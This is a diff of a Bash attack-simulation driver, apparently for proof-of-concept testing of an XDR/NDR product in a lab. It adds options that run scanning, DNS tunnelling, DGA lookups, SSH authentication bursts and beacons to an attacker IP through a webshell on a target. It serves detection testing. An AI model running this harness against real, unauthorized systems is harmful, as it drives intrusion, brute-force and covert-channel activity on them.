@@ -2,7 +2,7 @@
 # ==============================================================================
 # Stellar Cyber Open XDR / NDR / EDR / SIEM / UEBA PoC Telemetry Generator
 # Safe, non-destructive, runtime-dir-only simulation for authorized labs.
-# @stellar-poc-version: 1.0.0
+# @stellar-poc-version: 1.2.0
 # ==============================================================================
 
 # Strict mode: use -E -e -o pipefail; omit -u (nounset) because HAS_* flags are
@@ -10,42 +10,53 @@
 # rely on ${var:-default}. Full 'set -Eeuo pipefail' is not enabled globally.
 set -Eeo pipefail
 
+# Always visible on stderr (runs before log_message exists).
+poc_early_fatal() {
+    printf 'STELLAR_POC_ERROR: %s\n' "$*" >&2
+    exit "${2:-1}"
+}
+
 _SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 STELLAR_POC_VERSION=""
+SCRIPT_BUNDLE_VERSION=""
 
 load_stellar_poc_version() {
-    STELLAR_POC_VERSION="1.0.0"
-    if [[ -f "${_SCRIPT_DIR}/stellar_poc.version" ]]; then
-        STELLAR_POC_VERSION="$(tr -d '[:space:]' < "${_SCRIPT_DIR}/stellar_poc.version")"
+    local version_file="${_SCRIPT_DIR}/stellar_poc.version"
+    if [[ ! -f "${version_file}" ]]; then
+        poc_early_fatal "Missing Stellar PoC version file: ${version_file} (create stellar_poc.version with e.g. 1.1.0)"
     fi
-    [[ -n "${STELLAR_POC_VERSION}" ]] || STELLAR_POC_VERSION="0.0.0-dev"
+    SCRIPT_BUNDLE_VERSION="$(tr -d '[:space:]' < "${version_file}")"
+    [[ -n "${SCRIPT_BUNDLE_VERSION}" ]] || SCRIPT_BUNDLE_VERSION="0.0.0-dev"
+    STELLAR_POC_VERSION="${SCRIPT_BUNDLE_VERSION}"
 }
 
 read_companion_script_version() {
     local file="$1"
-    grep -m1 '^# @stellar-poc-version:' "${file}" 2>/dev/null | awk '{print $3}'
+    grep -m1 '@stellar-poc-version:' "${file}" 2>/dev/null | awk '{print $3}' || true
 }
 
 validate_companion_script_versions() {
-    local f expected="${STELLAR_POC_VERSION}" found mismatched=()
-    for f in stellar_poc_humanize.sh stellar_poc_followup.sh; do
-        found=$(read_companion_script_version "${_SCRIPT_DIR}/${f}")
+    local expected="${SCRIPT_BUNDLE_VERSION}" f base found mismatched=()
+    shopt -s nullglob
+    for f in "${_SCRIPT_DIR}"/stellar_poc*.sh; do
+        [[ -f "${f}" ]] || continue
+        base=$(basename "${f}")
+        found=$(read_companion_script_version "${f}")
         if [[ "${found}" != "${expected}" ]]; then
-            mismatched+=("${f}=${found:-missing}")
+            mismatched+=("${base}=${found:-missing}")
         fi
     done
+    shopt -u nullglob
     if ((${#mismatched[@]} > 0)); then
-        echo "ERROR: Stellar PoC script bundle version mismatch (expected ${expected}):" >&2
-        printf '  %s\n' "${mismatched[@]}" >&2
-        echo "Update @stellar-poc-version in all stellar_poc*.sh and stellar_poc.version together." >&2
-        exit 1
+        poc_early_fatal "Script bundle version mismatch (expected ${expected}): ${mismatched[*]} — update stellar_poc*.sh and stellar_poc.version together"
     fi
+    printf 'VERSION_CHECK result=pass bundle_version=%s\n' "${SCRIPT_BUNDLE_VERSION}" >&2
 }
 
 show_stellar_poc_version() {
     local git_rev="" git_dirty=""
     if git_rev=$(git -C "${_SCRIPT_DIR}" rev-parse --short HEAD 2>/dev/null); then
-        if [[ -n "$(git -C "${_SCRIPT_DIR}" status --porcelain -- stellar_poc.sh stellar_poc_humanize.sh stellar_poc_followup.sh stellar_poc.version 2>/dev/null)" ]]; then
+        if [[ -n "$(git -C "${_SCRIPT_DIR}" status --porcelain -- stellar_poc*.sh stellar_poc.version 2>/dev/null)" ]]; then
             git_dirty="-dirty"
         fi
         git_rev=" commit=${git_rev}${git_dirty}"
@@ -55,6 +66,10 @@ stellar-poc ${STELLAR_POC_VERSION}
   stellar_poc.sh
   stellar_poc_humanize.sh
   stellar_poc_followup.sh
+  stellar_poc_fast_safe.sh
+  stellar_poc_event_sot.sh
+  stellar_poc_network_simulators.sh
+  stellar_dns_tunnel_file_client.py
   stellar_poc.version${git_rev}
 EOF
 }
@@ -63,23 +78,25 @@ load_stellar_poc_version
 
 source_companion_scripts_or_exit() {
     local missing=() f
-    for f in stellar_poc_humanize.sh stellar_poc_followup.sh; do
+    for f in stellar_poc_humanize.sh stellar_poc_event_sot.sh stellar_poc_network_simulators.sh stellar_dns_tunnel_file_client.py stellar_poc_followup.sh stellar_poc_fast_safe.sh; do
         [[ -f "${_SCRIPT_DIR}/${f}" ]] || missing+=("${_SCRIPT_DIR}/${f}")
     done
     if ((${#missing[@]} > 0)); then
-        echo "ERROR: Required companion file(s) missing:" >&2
-        printf '  %s\n' "${missing[@]}" >&2
-        echo "Run:" >&2
-        echo "  ls -l ${_SCRIPT_DIR}/stellar_poc*.sh" >&2
-        exit 1
+        poc_early_fatal "Required companion file(s) missing: ${missing[*]} (expected under ${_SCRIPT_DIR})"
     fi
 }
 source_companion_scripts_or_exit
 validate_companion_script_versions
 # shellcheck source=stellar_poc_humanize.sh
 source "${_SCRIPT_DIR}/stellar_poc_humanize.sh"
+# shellcheck source=stellar_poc_event_sot.sh
+source "${_SCRIPT_DIR}/stellar_poc_event_sot.sh"
+# shellcheck source=stellar_poc_network_simulators.sh
+source "${_SCRIPT_DIR}/stellar_poc_network_simulators.sh"
 # shellcheck source=stellar_poc_followup.sh
 source "${_SCRIPT_DIR}/stellar_poc_followup.sh"
+# shellcheck source=stellar_poc_fast_safe.sh
+source "${_SCRIPT_DIR}/stellar_poc_fast_safe.sh"
 
 # --- Shared logical config (operator + remote) ---
 RUNTIME_DIR="/tmp/.poc_runtime_${USER:-unknown}"   # remote webshell runtime path (config/default)
@@ -106,19 +123,29 @@ SUMMARY_TXT=""
 CUSTOMER_SUMMARY_TXT=""
 
 WEB_SHELL_URL=""
-WEBSHELL_METHOD="GET"
+WEBSHELL_USER_METHOD="auto"
+WEBSHELL_METHOD="auto"
+WEBSHELL_EFFECTIVE_METHOD=""
+WEBSHELL_POST_SUPPORTED=false
+WEBSHELL_GET_SUPPORTED=false
+WEBSHELL_TRANSPORT_DISCOVERED=false
+PAYLOAD_FORCE_POST_BYTES=4000
 ATTACKER_IP=""
 ATTACKER_PORT=8000
 TARGET_NET=""
 NETWORK_PREFIX=""
 ATTACKER_BASE_URL=""
 
-MODE="balanced"             # quick|balanced|full
+MODE="fast-safe"            # fast-safe (default) | comprehensive | quick | balanced | full
+CLI_PIPELINE_MODE_EXPLICIT=false
 PROFILE="normal"            # stealth|normal|aggressive
 DRY_RUN=false
 SINGLE_STAGE=""
 KEEP_ARTIFACTS=false
 VERBOSE=false
+DEBUG=false
+WEBSHELL_LAST_EXIT_CODE=""
+WEBSHELL_LAST_EXEC_MS=0
 CAMPAIGN_ID=""
 
 CALLBACK_PREFIX="/api/v1"
@@ -132,6 +159,7 @@ SSH_FAIL_COUNT=20
 HTTP_SCAN_REPEAT=8
 MAX_TARGETS=24
 AUTO_OVERLAP=false
+OVERLAP_EXECUTED=false
 OVERLAP_PIDS=()
 LOCAL_HAS_CURL=false
 LOCAL_XARGS_PARALLEL_SUPPORTED=false
@@ -168,10 +196,37 @@ POC_INTENSITY="normal"
 DEFAULT_DURATION_MINUTES=10
 TOTAL_CYCLES_COMPLETED=0
 CURRENT_CYCLE=0
+POC_START_EPOCH=0
 CLI_BEACON_COUNT=""
 CLI_DNS_QUERY_COUNT=""
 CLI_HTTP_REPEAT=""
 CLI_SSH_FAIL_COUNT=""
+
+# Pre-WebShell local URL scan (attacker-side, before webshell internal stages)
+PRE_WEBSHELL_SCAN_BASE_URL=""
+PRE_WEBSHELL_SCAN_TARGET=""
+PRE_WEBSHELL_SCAN_TOTAL=0
+PRE_WEBSHELL_SCAN_UNIQUE=0
+PRE_WEBSHELL_SCAN_200=0
+PRE_WEBSHELL_SCAN_301=0
+PRE_WEBSHELL_SCAN_302=0
+PRE_WEBSHELL_SCAN_400=0
+PRE_WEBSHELL_SCAN_401=0
+PRE_WEBSHELL_SCAN_403=0
+PRE_WEBSHELL_SCAN_404=0
+PRE_WEBSHELL_SCAN_405=0
+PRE_WEBSHELL_SCAN_500=0
+PRE_WEBSHELL_SCAN_TIMEOUT=0
+PRE_WEBSHELL_SCAN_REAL_FAILED=0
+PRE_WEBSHELL_SCAN_REDIRECT=0
+PRE_WEBSHELL_SCAN_UA_PRESENT=0
+PRE_WEBSHELL_SCAN_ABNORMAL_UA=0
+PRE_WEBSHELL_SCAN_DURATION=0
+PRE_WEBSHELL_SCAN_LIKELIHOOD="low"
+PRE_WEBSHELL_SCAN_REASON=""
+PRE_WEBSHELL_SCAN_STAGE_STATUS="skipped"
+PRE_WEBSHELL_LAST_TRACK_RESULT=""
+PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED=0
 
 RED='\033[0;31m'
 YELLOW='\033[1;33m'
@@ -180,25 +235,72 @@ CYAN='\033[0;36m'
 BOLD='\033[1m'
 NC='\033[0m'
 
+log_console_prefix() {
+    local ts elapsed now
+    if [[ ! "${POC_START_EPOCH}" =~ ^[0-9]+$ || "${POC_START_EPOCH}" -lt 1 ]]; then
+        POC_START_EPOCH=$(date +%s)
+    fi
+    now=$(date +%s)
+    ts=$(date +"%Y-%m-%d %H:%M:%S")
+    elapsed=$((now - POC_START_EPOCH))
+    printf '[%s +%ss] ' "${ts}" "${elapsed}"
+}
+
 log_message() {
     local level="$1"
     local msg="$2"
-    local ts
-    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
-    [[ -n "${LOG_FILE}" ]] && echo "[$ts] [$level] $msg" >> "${LOG_FILE}"
+    local ts prefix plain
+    prefix=$(log_console_prefix)
+    ts=$(date +"%Y-%m-%d %H:%M:%S")
+    plain="[${ts}] [${level}] ${msg}"
+    if [[ -n "${LOG_FILE}" ]]; then
+        echo "${plain}" >> "${LOG_FILE}"
+    fi
     case "$level" in
-        ERROR) echo -e "${RED}[-] ERROR: ${msg}${NC}" ;;
-        WARN)  echo -e "${YELLOW}[!] WARN:  ${msg}${NC}" ;;
-        STAGE) echo -e "${CYAN}${BOLD}[*] STAGE: ${msg}${NC}" ;;
-        OK)    echo -e "${GREEN}[+] ${msg}${NC}" ;;
-        *)     echo "[.] ${msg}" ;;
+        ERROR) echo -e "${prefix}${RED}[-] ERROR: ${msg}${NC}" >&2 ;;
+        WARN)  echo -e "${prefix}${YELLOW}[!] WARN:  ${msg}${NC}" >&2 ;;
+        STAGE) echo -e "${prefix}${CYAN}${BOLD}[*] STAGE: ${msg}${NC}" >&2 ;;
+        OK)    echo -e "${prefix}${GREEN}[+] ${msg}${NC}" >&2 ;;
+        *)     echo "${prefix}[.] ${msg}" >&2 ;;
     esac
+}
+
+poc_fatal_exit() {
+    local msg="$1"
+    printf '\n============================================================\n' >&2
+    printf 'STELLAR PoC FAILED: %s\n' "${msg}" >&2
+    printf '============================================================\n' >&2
+    log_message "ERROR" "${msg}"
+    exit 1
+}
+
+probe_webshell_connectivity_or_exit() {
+    local status_code=""
+    [[ "${DRY_RUN}" == true ]] && return 0
+    [[ -z "${WEB_SHELL_URL}" ]] && poc_fatal_exit "--webshell URL is empty"
+    printf 'Checking webshell: %s\n' "${WEB_SHELL_URL}" >&2
+    build_curl_common_args 8
+    status_code=$(curl "${CURL_COMMON_ARGS[@]}" -sS -o /dev/null -w '%{http_code}' "${WEB_SHELL_URL}" 2>/dev/null) || status_code="000"
+    status_code="${status_code//$'\n'/}"
+    status_code="${status_code: -3}"
+    if [[ ! "${status_code}" =~ ^[0-9]{3}$ || "${status_code}" == "000" ]]; then
+        curl "${CURL_COMMON_ARGS[@]}" -sS -o /dev/null "${WEB_SHELL_URL}" 2>&1 || true
+        poc_fatal_exit "Webshell unreachable: ${WEB_SHELL_URL} (no HTTP response — verify host, port, firewall, and URL)"
+    fi
+    log_message "OK" "Webshell reachable (HTTP ${status_code})"
 }
 
 vlog() {
     if [[ "${VERBOSE}" == true ]]; then
-        echo "[VERBOSE] $*"
+        echo "$(log_console_prefix)[VERBOSE] $*" >&2
     fi
+}
+
+# Strip PoC console lines accidentally captured via $(run_webshell*) when verbose logging used stdout.
+strip_stdout_capture_noise() {
+    local raw="${1:-}"
+    [[ -z "${raw}" ]] && return 0
+    printf '%s\n' "${raw}" | grep -vE '^\[[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2} \+[0-9]+s\] \[(VERBOSE|DRY-RUN)' || true
 }
 
 # Safe line counting — never use "grep -c ... || echo 0" (produces "0\n0").
@@ -275,18 +377,39 @@ Usage: $0 --webshell URL --attacker-ip IP --target-net CIDR [options]
 Authorized lab / PoC only. Targets must stay inside --target-net.
 
 Required:
-  --webshell URL              Webshell endpoint (GET/POST command channel)
+  --webshell URL              Webshell endpoint (command channel; transport auto-detected)
+  --webshell-method MODE      auto|GET|POST [default: auto — probe POST then GET, prefer POST]
   --attacker-ip IP            Callback / listener IP for beacon simulation
   --target-net CIDR           Lab network to scan (only /24 supported)
 
 Optional:
   --version                   Print script bundle version and exit
+  --mode MODE                 Pipeline: fast-safe | comprehensive | quick | balanced | full
+                              [default: fast-safe — 5–10 min field PoC]
+                              comprehensive = full lab PoC (former default; overlap + DGA + full discovery)
+  --fast-safe-workers N       Parallel workers when mode is fast-safe [2–8, default: 4]
   --intensity LEVEL           Telemetry strength: light | normal | high | spike
                               [default: normal]
-  --duration-minutes N        How long to run pipeline cycles [default: 10]
+  --repeat-count N            Run exactly N full pipeline cycles (overrides --duration-minutes)
+  --duration-minutes N        Run until wall-clock limit [default: 10 if --repeat-count omitted]
   --attacker-port PORT        Callback HTTP port [default: 8000]
   --dry-run                   Print plan and reports without remote execution
   --verbose                   Extra operator logging
+  --debug                     Verbose logging plus webshell/precheck diagnostics
+  --dns-tunnel-mode MODE      DNS simulation: auto|cluster-local|infrastructure|txt-burst|all
+  --dns-server IP             Override DNS resolver for tunnel simulation
+  --dns-domain-suffix DOMAIN  Lab domain suffix [default: poc-dns-test.local]
+  --dns-max-queries N         Cap DNS tunnel query count [default: 250]
+  --dns-sleep-ms N            Inter-query sleep base (ms) [default: 50]
+  --dns-jitter-ms N           Inter-query jitter (ms) [default: 150]
+  --enable-dga                Run DGA Simulation stage [default: on]
+  --disable-dga               Skip DGA Simulation stage
+  --enable-dns-new-tld        Run DNS New TLD Test stage [default: on]
+  --disable-dns-new-tld       Skip DNS New TLD Test stage
+  --dga-base-domain TLD       Resolvable phase TLD [default: com]
+  --dga-dns-server IP         Override DNS resolver for DGA (query-validated; no 8.8.8.8 default)
+  --dga-nxdomain-queries N    High-entropy NXDOMAIN queries [min 80, default: 80]
+  --dga-resolvable-queries N  Resolvable follow-up queries [min 3, default: 3]
 
 Intensity guide:
   light   — quick functional test (minimal follow-up)
@@ -294,10 +417,19 @@ Intensity guide:
   high    — strong XDR/NDR/SIEM telemetry (aggressive follow-up bursts)
   spike   — ML/anomaly threshold burst (1000+ HTTP/SSH/DNS events per host)
 
+Mode guide:
+  fast-safe      — default; 5–10 min field PoC (parallel core stages, key-port discovery)
+  comprehensive  — full lab PoC (former default: full /24 discovery, overlap, DGA, process chain)
+  quick          — light pipeline only
+  balanced       — alias of comprehensive-style pipeline with normal intensity mapping
+  full           — comprehensive pipeline with aggressive intensity mapping
+
 Examples:
   $0 --webshell http://10.0.0.5/shell.jsp --attacker-ip 10.0.0.99 --target-net 10.0.0.0/24
   $0 ... --intensity high --duration-minutes 15
-  $0 ... --intensity spike --duration-minutes 5 --verbose
+  $0 ... --intensity spike --repeat-count 2 --verbose
+  $0 ... --fast-safe-workers 6
+  $0 ... --mode comprehensive --intensity normal --duration-minutes 15
 EOF
 }
 
@@ -309,21 +441,64 @@ parse_cli_switches() {
             --attacker-port) ATTACKER_PORT="${2:-}"; shift 2 ;;
             --target-net) TARGET_NET="${2:-}"; shift 2 ;;
             --intensity) POC_INTENSITY="${2:-}"; shift 2 ;;
-            --duration-minutes) DURATION_MINUTES="${2:-}"; shift 2 ;;
+            --repeat-count)
+                REPEAT_COUNT="${2:-}"
+                DURATION_MINUTES=0
+                shift 2
+                ;;
+            --duration-minutes)
+                if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]]; then
+                    vlog "Ignoring --duration-minutes because --repeat-count is set (${REPEAT_COUNT})"
+                else
+                    DURATION_MINUTES="${2:-}"
+                fi
+                shift 2
+                ;;
             --dry-run) DRY_RUN=true; shift ;;
             --verbose) VERBOSE=true; shift ;;
+            --debug) DEBUG=true; VERBOSE=true; shift ;;
             --version|-V) show_stellar_poc_version; exit 0 ;;
             --help|-h|--h|-?) show_usage_menu; exit 0 ;;
             --webshell-method) vlog "internal: --webshell-method"; WEBSHELL_METHOD="${2:-}"; shift 2 ;;
-            --mode) vlog "internal: --mode"; MODE="${2:-}"; shift 2 ;;
+            --mode) MODE="${2:-}"; CLI_PIPELINE_MODE_EXPLICIT=true; shift 2 ;;
+            --fast-safe-workers) parse_fast_safe_cli_switches "$1" "${2:-}" || { log_message "ERROR" "Unknown option: $1"; exit 1; }; shift 2 ;;
             --profile) vlog "internal: --profile"; PROFILE="${2:-}"; shift 2 ;;
-            --repeat-count) vlog "internal: --repeat-count"; REPEAT_COUNT="${2:-}"; shift 2 ;;
             --cycle-sleep) vlog "internal: --cycle-sleep"; PIPELINE_CYCLE_SLEEP="${2:-}"; shift 2 ;;
             --single-stage) vlog "internal: --single-stage"; SINGLE_STAGE="${2:-}"; shift 2 ;;
             --report-dir) vlog "internal: --report-dir"; REPORT_DIR="${2:-}"; shift 2 ;;
             --runtime-dir) vlog "internal: --runtime-dir"; CUSTOM_RUNTIME_DIR="${2:-}"; shift 2 ;;
             --secure-runtime) vlog "internal: --secure-runtime"; SECURE_RUNTIME=true; shift ;;
             --keep-artifacts) vlog "internal: --keep-artifacts"; KEEP_ARTIFACTS=true; shift ;;
+            --dns-tunnel-mode|--dns-server|--dns-domain-suffix|--dns-max-queries|--dns-sleep-ms|--dns-jitter-ms)
+                parse_followup_cli_switches "$1" "${2:-}" || { log_message "ERROR" "Unknown option: $1"; exit 1; }
+                shift 2
+                ;;
+            --enable-dga|--disable-dga|--enable-dns-new-tld|--disable-dns-new-tld)
+                parse_followup_cli_switches "$1" "${2:-}" || { log_message "ERROR" "Unknown option: $1"; exit 1; }
+                shift
+                ;;
+            --dga-base-domain|--dga-dns-server|--dga-nxdomain-queries|--dga-resolvable-queries)
+                parse_followup_cli_switches "$1" "${2:-}" || { log_message "ERROR" "Unknown option: $1"; exit 1; }
+                shift 2
+                ;;
+            --disable-edr-static-test|--edr-extended-files|--edr-cleanup|--no-edr-cleanup)
+                parse_followup_cli_switches "$1" "${2:-}" || { log_message "ERROR" "Unknown option: $1"; exit 1; }
+                shift
+                ;;
+            --followup-intensity|--service-spike|--service-spike-seconds|--force-aggressive-followup|--ssh-auth-burst|--ssh-burst-minutes|--ssh-attempts|--ssh-concurrency)
+                parse_followup_cli_switches "$1" "${2:-}" || { log_message "ERROR" "Unknown option: $1"; exit 1; }
+                case "$1" in
+                    --service-spike|--force-aggressive-followup|--ssh-auth-burst) shift ;;
+                    *) shift 2 ;;
+                esac
+                ;;
+            --persistent-beacon|--beacon-interval|--jitter-percent|--overlap|--max-overlap|--timing-profile|--slow-http|--slow-http-seconds|--noise-level|--warmup-minutes|--burst-mode|--burst-seconds)
+                parse_humanize_cli_switches "$1" "${2:-}" || { log_message "ERROR" "Unknown option: $1"; exit 1; }
+                case "$1" in
+                    --persistent-beacon|--overlap|--slow-http|--burst-mode) shift ;;
+                    *) shift 2 ;;
+                esac
+                ;;
             *) log_message "ERROR" "Unknown option: $1 (see --help)"; exit 1 ;;
         esac
     done
@@ -346,8 +521,16 @@ validate_inputs() {
     [[ -z "${WEB_SHELL_URL}" ]] && { log_message "ERROR" "--webshell is required"; exit 1; }
     [[ -z "${ATTACKER_IP}" ]] && { log_message "ERROR" "--attacker-ip is required"; exit 1; }
     [[ -z "${TARGET_NET}" ]] && { log_message "ERROR" "--target-net is required"; exit 1; }
-    [[ "${WEBSHELL_METHOD}" =~ ^(GET|POST)$ ]] || { log_message "ERROR" "--webshell-method GET|POST"; exit 1; }
-    [[ "${MODE}" =~ ^(quick|balanced|full)$ ]] || { log_message "ERROR" "--mode quick|balanced|full"; exit 1; }
+    case "${WEBSHELL_METHOD,,}" in
+        get|post|auto) WEBSHELL_USER_METHOD="${WEBSHELL_METHOD,,}" ;;
+        *) log_message "ERROR" "--webshell-method auto|GET|POST"; exit 1 ;;
+    esac
+    [[ "${WEBSHELL_USER_METHOD}" == auto ]] || WEBSHELL_METHOD="${WEBSHELL_USER_METHOD^^}"
+    [[ "${MODE}" =~ ^(fast-safe|comprehensive|quick|balanced|full)$ ]] || {
+        log_message "ERROR" "--mode fast-safe|comprehensive|quick|balanced|full"
+        exit 1
+    }
+    validate_fast_safe_options
     [[ "${PROFILE}" =~ ^(stealth|normal|aggressive)$ ]] || { log_message "ERROR" "--profile stealth|normal|aggressive"; exit 1; }
     [[ "${ATTACKER_IP}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || { log_message "ERROR" "Invalid --attacker-ip"; exit 1; }
     validate_ipv4_octet "${ATTACKER_IP}" "attacker-ip"
@@ -435,8 +618,9 @@ validate_execution_schedule_options() {
   fi
 
   if (( repeat_set == 1 && duration_set == 1 )); then
-    log_message "ERROR" "Use only one of --repeat-count or --duration-minutes (not both)"
-    exit 1
+    log_message "WARN" "--repeat-count is set (${REPEAT_COUNT}) — ignoring --duration-minutes (${DURATION_MINUTES})"
+    DURATION_MINUTES=0
+    duration_set=0
   fi
   if (( repeat_set == 1 )); then
     _validate_positive_int "--repeat-count" "${REPEAT_COUNT}" 1 10000
@@ -481,9 +665,20 @@ pipeline_schedule_description() {
   fi
 }
 
+pipeline_duration_label() {
+  if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]]; then
+    printf 'n/a (--repeat-count %s)' "${REPEAT_COUNT}"
+  elif [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]]; then
+    printf '%s minute(s)' "${DURATION_MINUTES}"
+  else
+    printf 'single-run'
+  fi
+}
+
 setup_environment() {
     refresh_runtime_paths
     [[ -z "${CAMPAIGN_ID}" ]] && CAMPAIGN_ID="stellar-poc-$(date +%Y%m%d%H%M%S)-${RANDOM}"
+    poc_obs_init_artifacts 2>/dev/null || true
     resolve_report_dirs
     LOCAL_STATE_DIR="${EFFECTIVE_REPORT_DIR}/.operator_state"
 
@@ -498,16 +693,17 @@ setup_environment() {
         exit 1
     fi
 
-    LOG_FILE="${LOG_DIR}/operator-${CAMPAIGN_ID}.log"
-    TIMELINE_LOG="${LOG_DIR}/timeline-${CAMPAIGN_ID}.log"
-    : > "${LOG_FILE}" 2>/dev/null || true
-    : > "${TIMELINE_LOG}" 2>/dev/null || true
-    MITRE_CSV="${REPORT_DIR}/mitre_mapping-${CAMPAIGN_ID}.csv"
-    REPORT_MD="${REPORT_DIR}/attack_chain_report-${CAMPAIGN_ID}.md"
-    SUMMARY_TXT="${REPORT_DIR}/summary-${CAMPAIGN_ID}.txt"
-    CUSTOMER_SUMMARY_TXT="${REPORT_DIR}/customer_summary-${CAMPAIGN_ID}.txt"
+    LOG_FILE="${POC_EXECUTION_LOG:-${LOG_DIR}/stellar_poc-${CAMPAIGN_ID}.log}"
+    TIMELINE_LOG="${LOG_FILE}"
+    if [[ -z "${POC_EXECUTION_LOG:-}" ]]; then
+        : > "${LOG_FILE}" 2>/dev/null || true
+    fi
+    MITRE_CSV=""
+    REPORT_MD="${POC_REPORT_CWD:-${REPORT_DIR}/stellar_poc-${CAMPAIGN_ID}_report.md}"
+    SUMMARY_TXT=""
+    CUSTOMER_SUMMARY_TXT=""
     export LOCAL_STATE_DIR EFFECTIVE_REPORT_DIR LOG_DIR CAMPAIGN_ID TARGET_NET NETWORK_PREFIX
-    export REMOTE_RUNTIME_DIR WEB_SHELL_URL ATTACKER_BASE_URL WEBSHELL_METHOD
+    export REMOTE_RUNTIME_DIR WEB_SHELL_URL ATTACKER_BASE_URL WEBSHELL_METHOD WEBSHELL_USER_METHOD WEBSHELL_EFFECTIVE_METHOD
 
     : > "${LOCAL_STATE_DIR}/executed_stages.log"
     : > "${LOCAL_STATE_DIR}/skipped_stages.log"
@@ -531,6 +727,10 @@ atomic_append_file() {
     local line="$2"
     local dir lock_file
     [[ -n "${path}" ]] || return 0
+    if [[ "${path}" == "${POC_EXECUTION_LOG:-}" || "${path}" == "${POC_REPORT_CWD:-}" || "${path}" == "${REPORT_MD:-}" || "${path}" == "${LOG_FILE:-}" ]]; then
+        printf '%s\n' "${line}" >> "${path}" 2>/dev/null || true
+        return 0
+    fi
     dir=$(dirname "${path}")
     safe_mkdir_p "${dir}"
     lock_file="${path}.lock"
@@ -574,6 +774,286 @@ safe_write_file() {
         log_message "WARN" "Failed to write ${path}"
         return 1
     }
+}
+
+# --- Overlap worker stage results (subshell-safe state files) ---
+REMOTE_PING_PATH=""
+PING_FLAVOR="unknown"
+PING_TTL_OPT="-t"
+PING_TIMEOUT_OPT="-W"
+PING_TTL_SUPPORTED=true
+
+overlap_env_sanitize_scalar() {
+    local v="$1"
+    v="${v//$'\r'/}"
+    v="${v//$'\n'/}"
+    [[ "${v}" =~ ^[A-Za-z0-9._:/+-]+$ ]] || return 1
+    printf '%s' "${v}"
+}
+
+overlap_enum_allowed() {
+    local val="$1" e
+    shift
+    for e in "$@"; do
+        [[ "${val}" == "${e}" ]] && return 0
+    done
+    return 1
+}
+
+overlap_stage_label_to_result_file() {
+    local label="$1"
+    case "${label}" in
+        "Enhanced DNS Tunnel"|"Mandatory DNS"|"DNS Tunnel Enhanced") printf '%s' "dns_tunnel_result.env"; return 0 ;;
+        "DGA Simulation") printf '%s' "dga_simulation_result.env"; return 0 ;;
+        "Internal Web Fanout"|"Correlation Internal Web Fanout") printf '%s' "internal_fanout_result.env"; return 0 ;;
+        "External Callback"|"Correlation External Callback") printf '%s' "external_callback_result.env"; return 0 ;;
+        "HTTP/HTTPS Follow-up"|"Mandatory HTTP URL Burst"|"HTTP URL Scan") printf '%s' "http_url_scan_result.env"; return 0 ;;
+        "Non-Standard Port Follow-up"|"Nonstandard Port Follow-up") printf '%s' "nonstandard_port_result.env"; return 0 ;;
+    esac
+    if [[ "${label}" =~ ^Spike-W[0-9]+\ HTTP$ ]]; then
+        printf '%s' "http_url_scan_result.env"
+        return 0
+    fi
+    printf '%s' ""
+}
+
+write_overlap_stage_result_env() {
+    local basename="$1"
+    local path key val sanitized
+    shift
+    [[ -n "${basename}" && -n "${LOCAL_STATE_DIR}" ]] || return 0
+    path="${LOCAL_STATE_DIR}/${basename}"
+    {
+        while (( $# >= 2 )); do
+            key="$1"
+            val="$2"
+            shift 2
+            sanitized=$(overlap_env_sanitize_scalar "${val}") || continue
+            printf '%s=%s\n' "${key}" "${sanitized}"
+        done
+    } > "${path}.tmp" 2>/dev/null && mv -f "${path}.tmp" "${path}" 2>/dev/null || rm -f "${path}.tmp" 2>/dev/null || true
+}
+
+mark_overlap_stage_result_timeout() {
+    local label="$1" reason="${2:-timeout}"
+    reason="${reason// /_}"
+    local basename stage_key
+    basename=$(overlap_stage_label_to_result_file "${label}")
+    [[ -z "${basename}" ]] && return 0
+    case "${basename}" in
+        dns_tunnel_result.env)
+            write_overlap_stage_result_env "${basename}" \
+                "DNS_TUNNEL_STAGE_STATUS" "failed" \
+                "DNS_QUERIES_PLANNED" "${DNS_TUNNEL_QUERY_COUNT:-0}" \
+                "DNS_QUERIES_ATTEMPTED" "0" \
+                "DEGRADED_TELEMETRY" "true" \
+                "OVERLAP_FAIL_REASON" "${reason}"
+            ;;
+        internal_fanout_result.env)
+            write_overlap_stage_result_env "${basename}" \
+                "INTERNAL_FANOUT_STATUS" "failed" \
+                "INTERNAL_FANOUT_TARGETS" "${INTERNAL_FANOUT_TARGETS:-0}" \
+                "INTERNAL_FANOUT_ATTEMPTED" "0" \
+                "INTERNAL_FANOUT_CONNECTED" "0" \
+                "INTERNAL_FANOUT_RESPONSES" "0" \
+                "OVERLAP_FAIL_REASON" "${reason}"
+            ;;
+        external_callback_result.env)
+            write_overlap_stage_result_env "${basename}" \
+                "EXTERNAL_CALLBACK_STATUS" "failed" \
+                "EXTERNAL_CALLBACK_ATTEMPTED" "0" \
+                "EXTERNAL_CALLBACK_CONNECTED" "0" \
+                "EXTERNAL_CALLBACK_RESPONSES" "0" \
+                "OVERLAP_FAIL_REASON" "${reason}"
+            ;;
+        http_url_scan_result.env)
+            write_overlap_stage_result_env "${basename}" \
+                "HTTP_URL_SCAN_STAGE_STATUS" "failed" \
+                "HTTP_SCAN_TARGET_COUNT" "${HTTP_SCAN_TARGET_COUNT:-0}" \
+                "HTTP_REQUESTS_PLANNED" "${HTTP_REQUESTS_PLANNED:-0}" \
+                "HTTP_REQUESTS_ATTEMPTED" "0" \
+                "HTTP_CONNECTED" "0" \
+                "HTTP_RESPONSES_RECEIVED" "0" \
+                "HTTPS_REQUESTS_ATTEMPTED" "0" \
+                "HTTPS_CONNECTED" "0" \
+                "HTTPS_RESPONSES_RECEIVED" "0" \
+                "WEB_RESPONSES_RECEIVED" "0" \
+                "HTTP_403_COUNT" "0" \
+                "HTTP_404_COUNT" "0" \
+                "HTTP_405_COUNT" "0" \
+                "DEGRADED_TELEMETRY" "true" \
+                "OVERLAP_FAIL_REASON" "${reason}"
+            ;;
+        nonstandard_port_result.env)
+            write_overlap_stage_result_env "${basename}" \
+                "NONSTANDARD_PORT_CONNECTIONS" "0" \
